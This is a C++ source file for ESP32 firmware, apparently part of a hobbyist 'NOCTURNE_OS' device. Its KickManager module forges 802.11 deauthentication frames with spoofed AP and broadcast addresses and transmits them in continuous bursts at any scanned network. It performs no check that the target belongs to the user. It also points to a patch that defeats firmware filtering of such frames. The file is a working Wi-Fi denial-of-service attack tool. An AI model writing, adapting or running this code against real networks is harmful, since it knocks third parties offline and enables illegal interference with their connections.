/*
 * NOCTURNE_OS — KickManager: 802.11 deauth frame injection.
 * Uses esp_wifi_80211_tx. Note: Some ESP32 firmware may filter deauth;
 * see esp32_deauth_patch if needed.
 */
#include "KickManager.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
/* Space out 80211_tx calls to avoid ESP32 stopping (doc: wait for send
 * completion). */
#define DEAUTH_INTERVAL_MS 100
#define DEAUTH_DELAY_BETWEEN_PACKETS_MS 30

KickManager::KickManager()
    : targetChannel_(1), targetSet_(false), targetIsOwnAP_(false),
      attacking_(false), lastBurstMs_(0), packetCount_(0),
      targetEncryption_(WIFI_AUTH_OPEN) {
  memset(targetBSSID_, 0, 6);
  targetSSID_[0] = '\0';
  memset(deauthBuf_, 0, sizeof(deauthBuf_));
}

void KickManager::begin() {
  // WiFi already started by NetManager or when entering RADAR/KICK
}

void KickManager::setTargetFromScan(int scanIndex) {
  int n = WiFi.scanComplete();
  if (n <= 0 || scanIndex < 0 || scanIndex >= n) {
    targetSet_ = false;
    targetSSID_[0] = '\0';
    targetEncryption_ = WIFI_AUTH_OPEN;
    return;
  }
  uint8_t *bssid = WiFi.BSSID(scanIndex);
  if (!bssid)
    return;
  memcpy(targetBSSID_, bssid, 6);
  targetChannel_ = (uint8_t)WiFi.channel(scanIndex);
  if (targetChannel_ < 1 || targetChannel_ > 14)
    targetChannel_ = 1;
  String ssidStr = WiFi.SSID(scanIndex);
  if (ssidStr.length() > 0) {
    size_t len = ssidStr.length();
    if (len >= KICK_TARGET_SSID_LEN)
      len = KICK_TARGET_SSID_LEN - 1;
    strncpy(targetSSID_, ssidStr.c_str(), len);
    targetSSID_[len] = '\0';
  } else {
    targetSSID_[0] = '\0';
  }
  targetEncryption_ = WiFi.encryptionType(scanIndex);
  targetSet_ = true;
  targetIsOwnAP_ =
      false; /* Атака на свою сеть разрешена по запросу пользователя */
}

bool KickManager::startAttack() {
  if (!targetSet_)
    return false;
  if (isTargetProtected()) {
    Serial.println("[KICK] WARNING: Target uses WPA3/PMF - attack may fail!");
  }
  attacking_ = true;
  lastBurstMs_ = millis();
  packetCount_ = 0;
  esp_wifi_set_promiscuous(true);
  Serial.println("[KICK] Attack START. (If targets don't disconnect, apply "
                 "esp32_deauth_patch)");
  return true;
}

void KickManager::stopAttack() {
  attacking_ = false;
  esp_wifi_set_promiscuous(false);
  Serial.println("[KICK] Attack STOP.");
}

void KickManager::sendDeauthBurst() {
  if (WiFi.getMode() == WIFI_OFF) {
    Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
    return;
  }

  esp_err_t chErr = esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
  if (chErr != ESP_OK) {
    Serial.printf("[KICK] set_channel(%d) error: %d\n", (int)targetChannel_,
                  (int)chErr);
  }

  // 26-byte deauth: FC(2), Duration(2), DA(6), SA(6), BSSID(6), Seq(2),
  // Reason(2)
  deauthBuf_[0] = 0xC0;
  deauthBuf_[1] = 0x00;
  deauthBuf_[2] = 0x00;
  deauthBuf_[3] = 0x00;
  deauthBuf_[22] = 0x00;
  deauthBuf_[23] = 0x00;

  // 1) DA=broadcast, SA=AP — reason 7 and 1
  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6);
  memcpy(deauthBuf_ + 10, targetBSSID_, 6);
  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
  deauthBuf_[24] = 0x07;
  deauthBuf_[25] = 0x00;
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
  deauthBuf_[24] = 0x01;
  deauthBuf_[25] = 0x00;
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);

  // 2) DA=AP, SA=broadcast (fake client leaving)
  memcpy(deauthBuf_ + 4, targetBSSID_, 6);
  memcpy(deauthBuf_ + 10, DEAUTH_BROADCAST, 6);
  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
  deauthBuf_[24] = 0x07;
  deauthBuf_[25] = 0x00;
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
  deauthBuf_[24] = 0x01;
  deauthBuf_[25] = 0x00;
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);

  // 3) Extra broadcast deauth
  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6);
  memcpy(deauthBuf_ + 10, targetBSSID_, 6);
  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
  deauthBuf_[24] = 0x07;
  deauthBuf_[25] = 0x00;
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
    packetCount_++;
}

void KickManager::tick() {
  if (!attacking_ || !targetSet_)
    return;
  unsigned long now = millis();
  if (now - lastBurstMs_ < (unsigned long)DEAUTH_INTERVAL_MS)
    return;
  lastBurstMs_ = now;
  sendDeauthBurst();
}

void KickManager::getTargetSSID(char *out, size_t maxLen) const {
  if (maxLen == 0)
    return;
  strncpy(out, targetSSID_, maxLen - 1);
  out[maxLen - 1] = '\0';
}

void KickManager::getTargetBSSIDStr(char *out, size_t maxLen) const {
  if (maxLen < KICK_TARGET_BSSID_LEN)
    return;
  snprintf(out, maxLen, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID_[0],
           targetBSSID_[1], targetBSSID_[2], targetBSSID_[3], targetBSSID_[4],
           targetBSSID_[5]);
}

bool KickManager::isTargetProtected() const {
  return (targetEncryption_ == WIFI_AUTH_WPA3_PSK ||
          targetEncryption_ == WIFI_AUTH_WPA2_WPA3_PSK);
}
